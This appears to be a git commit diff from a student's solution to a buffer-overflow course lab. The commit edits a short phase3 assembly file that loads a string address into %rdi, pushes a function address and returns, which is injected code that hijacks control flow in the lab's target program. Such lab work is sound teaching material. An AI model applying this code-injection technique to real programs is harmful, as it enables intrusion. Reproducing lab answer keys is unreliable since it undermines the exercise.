8a797a6addad9d6bd53419fdf3a6243a85349440
Nguyễn Đình Thiên Lộc <dinhthienlocnguyen@gmail.com>
2025-12-16 05:25:48 +0000

    Solved all 5 phases

--- Week8/target1/phase3.s
+++ Week8/target1/phase3.s
@@ -1,10 +1,3 @@
-# phase3.s
-
-# 1. Move the address of the string (Buffer + 0x14) into %rdi
-mov $0x5561dc8c, %rdi
-
-# 2. Push the address of touch3 onto the stack
-push $0x401908
-
-# 3. Return (This pops the address we just pushed and jumps to touch3)
+movq $0x5561dca8, %rdi
+pushq $0x401908
 ret
